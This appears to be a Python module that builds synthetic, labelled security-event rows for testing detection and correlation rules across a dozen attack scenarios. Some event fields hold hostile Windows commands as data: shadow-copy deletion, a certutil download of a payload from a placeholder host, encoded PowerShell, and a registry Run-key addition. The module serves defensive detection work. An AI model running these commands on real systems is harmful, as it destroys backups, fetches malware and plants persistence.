"""Rule-correlation demo scenarios; generation creates event rows only."""
from __future__ import annotations

from datetime import datetime, timedelta, timezone
import uuid

TAXONOMY_SCENARIOS_METADATA = {
    "multi_stage_takeover": {"layer": "user/identity", "status": "implemented"},
    "brute_force_only": {"layer": "user/identity", "status": "implemented"},
    "impossible_travel_takeover": {"layer": "user/identity", "status": "implemented"},
    "credential_stuffing_burst": {"layer": "user/identity", "status": "implemented"},
    "ransomware_bulk_encryption": {"layer": "device/endpoint", "status": "implemented"},
    "defense_evasion_lolbins": {"layer": "device/endpoint", "status": "implemented"},
    "persistence_registry_runkey": {"layer": "device/endpoint", "status": "implemented"},
    "dns_tunneling_exfiltration": {"layer": "network", "status": "implemented"},
    "c2_periodic_beaconing": {"layer": "network", "status": "implemented"},
    "port_scan_reconnaissance": {"layer": "network", "status": "implemented"},
    "apt_lateral_movement_chain": {"layer": "cross-layer", "status": "implemented"},
    "unknown_novel_zero_day": {"layer": "unknown/novel", "status": "synthetic proxy"},
}


def generate_demo_events(now: datetime | None = None, include_extended: bool = False) -> list[dict]:
    """Return labelled synthetic event dictionaries for four fixed scenarios."""
    anchor = now or datetime.now(timezone.utc)
    if anchor.tzinfo is None:
        anchor = anchor.replace(tzinfo=timezone.utc)
    anchor = anchor.astimezone(timezone.utc)
    day = anchor.date()
    events: list[dict] = []

    def add(scenario: str, at: datetime, user: str, device: str, source_ip: str,
            category: str, event_type: str, **fields) -> None:
        events.append({
            "event_id": f"demo_{uuid.uuid4().hex[:16]}",
            "timestamp": at,
            "user_id": user,
            "device_id": device,
            "source_ip": source_ip,
            "event_category": category,
            "event_type": event_type,
            "status": "success",
            "privilege_level": "standard",
            "bytes_transferred": 0,
            "location": "Synthetic demo",
            "dataset": "synthetic_demo",
            "scenario": scenario,
            **fields,
        })

    def time_at(hour: int, minute: int, *, days_ago: int = 0) -> datetime:
        return datetime.combine(day - timedelta(days=days_ago), datetime.min.time(), tzinfo=timezone.utc).replace(
            hour=hour, minute=minute
        )

    # (a) Multi-stage takeover: baseline success, failure burst, unusual login,
    # privilege change, encoded script, rare outbound port, and external transfer.
    takeover_user, takeover_device = "demo_takeover_user", "demo_takeover_device"
    add("multi_stage_takeover", time_at(10, 0, days_ago=2), takeover_user, takeover_device,
        "1.1.1.1", "auth", "login_success", raw_payload={"source": "baseline_login"})
    for minute in (0, 2, 4, 6, 8):
        add("multi_stage_takeover", time_at(2, minute), takeover_user, takeover_device,
            "8.8.4.4", "auth", "login_failure", status="failure")
    add("multi_stage_takeover", time_at(2, 30), takeover_user, takeover_device,
        "8.8.4.4", "auth", "login_success")
    add("multi_stage_takeover", time_at(2, 35), takeover_user, takeover_device,
        "8.8.4.4", "access", "privilege_change", privilege_level="admin",
        raw_payload={"previous_privilege": "standard", "new_privilege": "admin"})
    add("multi_stage_takeover", time_at(2, 38), takeover_user, takeover_device,
        "8.8.4.4", "endpoint", "process_start", process_name="powershell.exe",
        command_line="powershell.exe -enc SQBFAFgA", raw_payload={"parent_process": "winword.exe"})
    add("multi_stage_takeover", time_at(2, 42), takeover_user, takeover_device,
        "8.8.4.4", "network", "outbound_connection", destination_ip="8.8.8.8",
        destination_port=4444)
    add("multi_stage_takeover", time_at(2, 50), takeover_user, takeover_device,
        "8.8.4.4", "network", "data_transfer", destination_ip="8.8.8.8",
        destination_port=443, bytes_transferred=150 * 1024 * 1024)

    # (b) Password guessing with no successful login or post-authentication activity.
    brute_user, brute_device = "demo_bruteforce_user", "demo_bruteforce_device"
    for minute in (0, 2, 4, 6, 8):
        add("brute_force_only", time_at(14, minute), brute_user, brute_device,
            "198.51.100.24", "auth", "login_failure", status="failure")

    # (c) Benign admin maintenance: two rule indicators, but only two indicator types.
    add("benign_admin", time_at(10, 15), "demo_admin", "demo_admin_device",
        "10.20.30.40", "access", "privilege_change", privilege_level="admin",
        raw_payload={"previous_privilege": "standard", "new_privilege": "admin", "change_ticket": "CHG-DEMO-12"})
    add("benign_admin", time_at(10, 30), "demo_admin", "demo_admin_device",
        "10.20.30.40", "network", "backup_transfer", destination_ip="10.20.30.50",
        destination_port=445, bytes_transferred=180 * 1024 * 1024,
        raw_payload={"transfer_purpose": "scheduled backup"})

    # (d) Ordinary daytime work with no configured rule indicators.
    normal_user, normal_device = "demo_employee", "demo_employee_device"
    add("normal_employee_day", time_at(9, 0), normal_user, normal_device,
        "10.40.0.25", "auth", "login_success")
    add("normal_employee_day", time_at(9, 10), normal_user, normal_device,
        "10.40.0.25", "endpoint", "process_start", process_name="outlook.exe")
    add("normal_employee_day", time_at(9, 20), normal_user, normal_device,
        "10.40.0.25", "network", "outbound_connection", destination_ip="93.184.216.34",
        destination_port=443, bytes_transferred=2 * 1024 * 1024)
    add("normal_employee_day", time_at(11, 0), normal_user, normal_device,
        "10.40.0.25", "access", "file_read", raw_payload={"resource": "team calendar"})

    return generate_all_taxonomy_scenarios(anchor) if include_extended else sorted(events, key=lambda event: event["timestamp"])


def generate_all_taxonomy_scenarios(now: datetime | None = None) -> list[dict]:
    """Return the 12 core threat scenarios plus the two existing benign baselines.

    These rows are synthetic signatures for demo and rule exercises, not captured telemetry.
    """
    anchor = now or datetime.now(timezone.utc)
    if anchor.tzinfo is None:
        anchor = anchor.replace(tzinfo=timezone.utc)
    rows = generate_demo_events(anchor)
    def add(scenario, offset, category, event_type, **fields):
        rows.append({"event_id": f"demo_{uuid.uuid4().hex[:16]}", "timestamp": anchor + timedelta(minutes=offset),
                     "user_id": fields.pop("user_id", f"demo_{scenario}"), "device_id": fields.pop("device_id", f"host_{scenario}"),
                     "source_ip": fields.pop("source_ip", "198.51.100.10"), "event_category": category,
                     "event_type": event_type, "status": "success", "privilege_level": "standard",
                     "bytes_transferred": 0, "location": "Synthetic demo", "dataset": "synthetic_demo",
                     "scenario": scenario, **fields})
    add("impossible_travel_takeover", -30, "auth", "login_success", user_id="travel_user", source_ip="192.0.2.10", location="Region A")
    add("impossible_travel_takeover", -15, "auth", "login_success", user_id="travel_user", source_ip="203.0.113.90", location="Region B")
    for n in range(10):
        add("credential_stuffing_burst", -20+n, "auth", "login_failure", user_id=f"target{n}", status="failure", source_ip="198.51.100.99")
    for n in range(12):
        add("ransomware_bulk_encryption", -12+n, "endpoint", "file_modify", file_path=f"C:/Users/demo/file{n}.locked")
    add("ransomware_bulk_encryption", -1, "endpoint", "process_start", process_name="vssadmin.exe", command_line="vssadmin.exe delete shadows /all /quiet")
    add("defense_evasion_lolbins", -8, "endpoint", "process_start", process_name="certutil.exe", command_line="certutil.exe -urlcache -split -f https://example.invalid/payload.exe")
    add("persistence_registry_runkey", -7, "endpoint", "process_start", process_name="reg.exe", command_line=r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run")
    for n in range(6):
        add("dns_tunneling_exfiltration", -6+n, "network", "dns_query", query_name=f"{'a'*96}{n}.example.invalid", record_type="TXT", payload_length=104, entropy=4.7)
    for n in range(5):
        add("c2_periodic_beaconing", -50+n*10, "network", "outbound_connection", destination_ip="203.0.113.25", destination_port=8443)
    for port in (21, 22, 80, 443, 445, 3389):
        add("port_scan_reconnaissance", -4, "network", "connection_attempt", destination_ip="10.0.0.15", destination_port=port, protocol="TCP", flags="SYN")
    for category, event_type, fields in (("auth", "login_success", {"source_ip":"198.51.100.55"}),
             ("endpoint", "process_start", {"process_name":"powershell.exe", "command_line":"powershell.exe -enc ..."}),
             ("network", "smb_access", {"share":"C$", "destination_ip":"10.0.0.9"}),
             ("network", "data_transfer", {"destination_ip":"203.0.113.8", "bytes_transferred":50000000})):
        add("apt_lateral_movement_chain", -3, category, event_type, **fields)
    add("unknown_novel_zero_day", -2, "network", "anomalous_flow", packet_entropy=7.9, packet_distribution="novel_proxy", open_set_score=0.97)
    return sorted(rows, key=lambda event: event["timestamp"])
